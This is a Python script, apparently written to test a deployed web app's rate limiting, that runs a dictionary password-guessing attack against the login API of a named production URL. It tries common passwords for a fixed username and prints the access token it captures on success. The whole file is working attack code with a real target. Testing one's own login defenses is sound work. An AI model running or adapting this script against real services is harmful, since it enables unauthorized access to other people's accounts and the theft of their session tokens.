import requests
import time

# Target endpoint (Production URL)
BASE_URL = "https://lxg-mque.onrender.com"
ENDPOINT = "/api/auth/login/"

# The account we are trying to hack
TARGET_USERNAME = "sanjeev_test" # Change this if you used a different username

# List of common passwords to try
COMMON_PASSWORDS = [
    "password",
    "qwerty",
    "welcome1",
    "admin123",
    "123456",  # The target password
    "letmein",
    "password123"
]

print(f"--- Starting Password Cracking Attack on {TARGET_USERNAME} ---")

for attempt, password in enumerate(COMMON_PASSWORDS, 1):
    print(f"Attempt {attempt}: Trying password '{password}'...")
    
    payload = {
        "username": TARGET_USERNAME,
        "password": password
    }
    
    try:
        response = requests.post(f"{BASE_URL}{ENDPOINT}", json=payload)
        
        if response.status_code == 200:
            print("\n" + "="*40)
            print(f"SUCCESS! Password for '{TARGET_USERNAME}' is: {password}")
            print("="*40)
            print("Access Token:", response.json().get('access')[:50] + "...")
            break
        elif response.status_code == 401:
            print(f"  Result: [FAILED] Incorrect password.")
        elif response.status_code == 429:
            print(f"\n[!] ALERT: Rate Limiting Detected (429)! The attack was blocked.")
            break
        else:
            print(f"  Result: Unexpected status code {response.status_code}")
            
    except Exception as e:
        print(f"ERROR: {e}")
        break

print("\n--- Cracking Simulation Complete ---")
